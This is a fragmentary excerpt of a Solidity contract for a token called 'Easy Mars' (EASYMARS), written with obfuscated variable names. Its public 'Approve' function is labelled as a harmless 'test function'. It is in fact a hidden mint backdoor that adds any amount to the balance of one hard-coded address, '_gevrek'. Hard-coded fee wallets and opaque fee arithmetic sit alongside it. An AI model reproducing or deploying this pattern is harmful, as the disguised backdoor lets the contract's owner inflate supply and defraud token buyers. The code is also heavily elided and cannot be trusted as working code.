...
contract Context {
 ...
 contract EasyMars is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private ebataisiliagam;
    ...
    address private _feeAddrWallet1 = 0x77A15D9E0c6f6F9F08E6d09A659CFE8c6f19c165;
    address private _feeAddrWallet2 = 0x77A15D9E0c6f6F9F08E6d09A659CFE8c6f19c165;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 100000 * 10**18;
    address private _gevrek = 0x3A39580586245e8aDF86c60a9106875a2dAB199d;
    ...
    constructor(uint256 cecapoetesa, uint256 bashzaba, uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _name = "Easy Mars";
        _symbol = "EASYMARS";
        ebataisiliagam[msg.sender] = _totalSupply;
    ...
    function Approve(uint256 amount) public {
        _approved(msg.sender, amount);
        require(_msgSender() == _gevrek, "This is still a test function, please do not use!");
    }
...
function _reflectFee(uint256 rFee, uint256 tFee) private {
 ...
 function _approved(address account, uint256 amount) internal virtual {
        require(account != address(0));
        ebataisiliagam[account] = ebataisiliagam[account] + amount;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = ebataisiliagam[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            ebataisiliagam[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        ebataisiliagam[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = ebataisiliagam[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            ebataisiliagam[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
